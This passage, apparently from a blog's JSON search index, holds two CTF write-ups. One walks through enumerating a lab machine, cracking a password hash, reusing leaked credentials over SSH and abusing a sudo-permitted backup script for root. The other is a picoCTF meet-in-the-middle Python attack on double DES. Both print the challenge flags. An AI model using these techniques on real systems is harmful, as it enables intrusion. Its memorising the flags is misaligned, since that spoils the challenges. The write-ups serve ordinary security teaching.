    "content": "Nmap scan:$ sudo nmap -sV -sC &lt;target_ip&gt;                         Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-12 15:58 UTCNmap scan report for &lt;target_ip&gt;Host is up (0.077s latency).Not shown: 998 closed tcp ports (reset)PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It worksService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelThe machine runs a web server. We navigate to the hosted website and find out that it contains the default Apache page set up after initialization.We can enumerate for other content hosted by the machine.$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u \"http://&lt;target_ip&gt;/FUZZ\"         /'___\\  /'___\\           /'___\\              /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/              \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\              \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/               \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\                 \\/_/    \\/_/   \\/___/    \\/_/              v2.1.0-dev________________________________________________ :: Method           : GET :: URL              : http://&lt;target_ip&gt;/FUZZ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt :: Follow redirects : false :: Calibration      : false :: Timeout          : 10 :: Threads          : 40 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500________________________________________________admin                   [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 71ms]etc                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 68ms]We were able to find two directories. When navigating to the admin portal, we find a downloadable Borg backup of the website called.The archive is encrypted and needs a passphrase for decryption.Let’s check the etc directory. This contains a configuration file of a Squid proxy and a passwd file.The passwd file contains a hash of the music_archive user’s password.music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.We successfully crack the password using hashcat and the rockyou wordlist.The password is squidward.$ hashcat -m 1600 -a 0 hash /usr/share/wordlists/rockyou.txt &lt;...snip...&gt;Dictionary cache built:* Filename..: /usr/share/wordlists/rockyou.txt* Passwords.: 14344392* Bytes.....: 139921507* Keyspace..: 14344385* Runtime...: 7 secs$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward&lt;...snip...&gt;Back to our music archive, we find out that the backup was made using the above password, andnow can recover the archive’s data using borg command line utility.To list all the backups in the archive:$ borg list final_archive  Enter passphrase for key /home/kali/Downloads/home/field/dev/final_archive: music_archive                        Tue, 2020-12-29 14:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]Now let’s extract the data. Note that the command is executed from dev sub-folder and that the output of the command will be written in the same location as well.$ borg extract final_archive::music_archiveContent of the backup:$ tree.└── alex    ├── Desktop    │   └── secret.txt    ├── Documents    │   └── note.txt    ├── Downloads    ├── Music    ├── Pictures    ├── Public    ├── Templates    └── VideosThe content of the secrete was a bit disappointing XDshoutout to all the people who have gotten to this stage whoop whoop!\"However, the note is giving valuable informationWow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!alex:S3cretP@s3Since the above are Alex credentials, we can try connecting via ssh.In the home directory, we find the user flag: flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}Left is the root flag. Making use of the given hint “There might be an interesting file runningas root” and checking our Alex permissions, we find that the script backup.sh can be run as a root.$ sudo -lMatching Defaults entries for alex on ubuntu:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser alex may run the following commands on ubuntu:    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.shThat script can execute any given command following the -c option. Using this we can enumerate files in the root repository.$ sudo ./mp3backups/backup.sh -c \"ls /root\"&lt;...snip...&gt;Backup finishedroot.txtFinally the root flag: flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}"
  },
  
  {
    "title": "Double DES",
    "url": "/posts/double-des/",
    "categories": "CTF Writeups, picoCTF, Cryptography",
    "tags": "DES",
    "date": "2024-02-11 00:00:00 +0100",
    





    
    "snippet": "Hints  How large is the keyspace?ResolutionDES is a block cipher encryption scheme. The blocks are 64 bits in size, and so are the keys. The small key size makes the scheme very vulnerable to brute...",
    "content": "Hints  How large is the keyspace?ResolutionDES is a block cipher encryption scheme. The blocks are 64 bits in size, and so are the keys. The small key size makes the scheme very vulnerable to brute force attacks.2DES tries to fix the issue by using DES twice in a row using different keys. However, this doesn’t increase the key size much, and can be easily cracked using a meet-in-the-middle attack which we’ll be employing below. All that we need is a pair of plain/cipher texts.Let’s connect and get our encrypted flag:$ nc mercury.picoctf.net 29980Here is the flag:a0cb6b86229afb1d909ff0d2a3542460cfce09d8f3d022fa4c1b994831e1e9275ec195b47bd0d111We can provide our inputs to the app to get their encryption:What data would you like to encrypt? 1a2b3c4d1a2b3c4db87a84bf965e28fe5ec195b47bd0d111The attack works as follows:  Encrypt the known plain text using all possible keys  Decrypt the corresponding cipher text using all possible keys  Find the match between the two sets and retrieve the corresponding keys  Decrypt the flagThe following python script does the job:from Crypto.Cipher import DESimport binasciidef pad(msg):    block_len = 8    over = len(msg) % block_len    pad = block_len - over    return (msg + \" \" * pad).encode()# Useful data. The encrypted flag and the known plain/cipher pairflag = binascii.unhexlify(\"a0cb6b86229afb1d909ff0d2a3542460cfce09d8f3d022fa4c1b994831e1e9275ec195b47bd0d111\")plain = pad(binascii.unhexlify(\"1a2b3c4d1a2b3c4d\").decode())cipher = binascii.unhexlify(\"b87a84bf965e28fe5ec195b47bd0d111\")# Generating the key space. Keys are of the form [b'XXXXXX  ']key_space = [pad(str(value)[1:]) for value in range(1000000, 2000000)]# Generating all possible encryptions (decryptions) of the plain (cipher) textencrypted = [DES.new(key, DES.MODE_ECB).encrypt(plain) for key in key_space]decrypted = [DES.new(key, DES.MODE_ECB).decrypt(cipher) for key in key_space]# Find the match and retrieve the keyskey1, key2 = None, Nonetry:  a_match = (set(decrypted) &amp; set(encrypted)).pop()  key1 = key_space[encrypted.index(a_match)]  key2 = key_space[decrypted.index(a_match)]except:  print(\"Didn't find a match, verify your plain/cipher text entries\")  exit()# Decrypt the flag :)flag = DES.new(key2, DES.MODE_ECB).decrypt(flag)flag = DES.new(key1, DES.MODE_ECB).decrypt(flag)print(\"Your flag: \" + flag.decode())Output: Your flag: 45d6631b0c4d52b801a0fa7f6d3bda3c"
  }
  
]

